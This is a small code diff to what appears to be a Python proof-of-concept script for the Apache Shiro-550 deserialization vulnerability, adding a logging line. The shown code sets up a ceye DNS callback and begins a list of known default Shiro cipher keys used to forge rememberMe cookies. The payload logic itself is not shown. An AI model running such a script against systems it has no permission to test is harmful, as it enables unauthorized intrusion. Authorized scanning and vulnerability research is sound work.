@@ -6,6 +6,7 @@ import asyncio
 import uuid
 import subprocess
 from Crypto.Cipher import AES
+from lib.core.data import logger
 from lib.utils.cipher import base64encode
 from lib.utils.cipher import base64decode
 from lib.utils.connect import ClientSession
@@ -37,6 +38,7 @@ class POC(Script):
         await self.get_url()
         if self.base_url:
             dns = self.ceye_dns_api(k='shiro550', t='dns')
+            logger.sysinfo(dns + ' ------- '+  self.base_url)
             async with ClientSession() as session:
                 keylist = [
                             'kPH+bIxk5D2deZiIxcaaaA==',
